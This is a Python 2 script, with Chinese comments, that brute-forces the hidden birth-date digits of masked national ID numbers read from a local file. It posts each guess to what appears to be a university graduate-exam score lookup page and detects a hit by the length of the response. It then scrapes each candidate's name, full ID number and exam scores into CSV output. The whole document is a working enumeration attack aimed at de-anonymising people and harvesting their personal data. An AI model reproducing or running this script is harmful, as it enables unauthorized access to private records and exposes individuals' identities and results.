#!/usr/bin/env python 
# -*- coding:utf-8 -*-

import requests
import re

url = 'http://xxxx.cn/queryport1/Recruit_20190419.asp?action=check'
headers = {'content-type': "application/x-www-form-urlencoded", 'Content-Length': '56'}

# 获取考生姓名、证件号、外国语成绩、业务课1、业务课2、政治理论成绩（"-1"为缺考）
# 输入：身份证信息sfz，如"350122******160114"
# 输出：考生姓名、证件号、外国语成绩、业务课1、业务课2、政治理论成绩
def fjnu_find(sfz):
    ks_name = ""
    ks_num = ""
    ks_waiguoyu = ""
    ks_yewuke1 = ""
    ks_yewuke2 = ""
    ks_zhengzhililun = ""

    sfz_arr = sfz.split('******')
    yymm_num = ""
    y = 70
    m = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12']
    found = False   # 爆破成功则退出，不再继续爆破

    # 循环测试，遍历1970-1999年份
    while y < 99:
        for mm in m:
            x = str(y) + mm
            body = {"s_zjhm": sfz_arr[0] + "19" + x + sfz_arr[1], "imageField.x": "13", "imageField.y": "5"}
            response = requests.post(url, data=body, headers=headers)
            if len(response.text) != 1200: # 1200是失败页面返回的字符串长度，出现非失败页面说明爆破成功了
                html = response.text.encode(response.encoding).decode('gbk').encode('utf8')
                ks_name,ks_waiguoyu,ks_yewuke1,ks_yewuke2,ks_zhengzhililun = fjnu_pe(html)
                ks_num = sfz_arr[0] + "19" + x + sfz_arr[1]
                found = True # 爆破成功则退出
                break
        if found:
            break
        y = y + 1
    return ks_name,ks_num,ks_waiguoyu,ks_yewuke1,ks_yewuke2,ks_zhengzhililun

# 解析考试结果html页面，取得考生姓名、外国语成绩、业务课1、业务课2、政治理论成绩
def fjnu_pe(html):
    ks_name = ""
    ks_num = ""
    ks_waiguoyu = ""
    ks_yewuke1 = ""
    ks_yewuke2 = ""
    ks_zhengzhililun = ""

    ph_re = re.compile(r'"txt1">.*</td>')
    matchs = ph_re.findall(html)
    ks_name = matchs[0][7:-5]
    ks_waiguoyu = matchs[4][7:-5]
    ks_yewuke1 = matchs[5][7:-5]
    ks_yewuke2 = matchs[6][7:-5]
    ks_zhengzhililun = matchs[7][7:-5]
    return ks_name,ks_waiguoyu,ks_yewuke1,ks_yewuke2,ks_zhengzhililun

# 读入record.txt行，取得学院名称，专业名称，证件号码
# 返回值：编号，学院名称，专业名称，考生姓名、身份证、外国语成绩、业务课1、业务课2、政治理论成绩
def fjnu_line(line):
    line_arr = line.split('\t')
    ks_n = line_arr[0]
    ks_xueyuan = line_arr[1]
    ks_zhuanye = line_arr[2]
    ks_name = ""
    ks_num = ""
    ks_waiguoyu = ""
    ks_yewuke1 = ""
    ks_yewuke2 = ""
    ks_zhengzhililun = ""

    ks_name,ks_num,ks_waiguoyu,ks_yewuke1,ks_yewuke2,ks_zhengzhililun = fjnu_find(line_arr[3])
    return ks_n,ks_xueyuan,ks_zhuanye,ks_name,ks_num,ks_waiguoyu,ks_yewuke1,ks_yewuke2,ks_zhengzhililun



f = open("./record.txt")
line = f.readline()
print "总序号,学院名称,专业名称,姓名,身份证号,外国语成绩,业务课1,业务课2,政治理论成绩"
while line:
    # print line
    fjnu_arr = fjnu_line(line)
    line = f.readline() # 逐行读入record.txt信息
    fjnu_str = fjnu_arr[0] + ',' + fjnu_arr[1] + ',' + fjnu_arr[2] + ',' + fjnu_arr[3] + ',' + fjnu_arr[4] + ',' + fjnu_arr[5] + ',' + fjnu_arr[6] + ',' + fjnu_arr[7] + ',' + fjnu_arr[8]
    print fjnu_str
f.close()
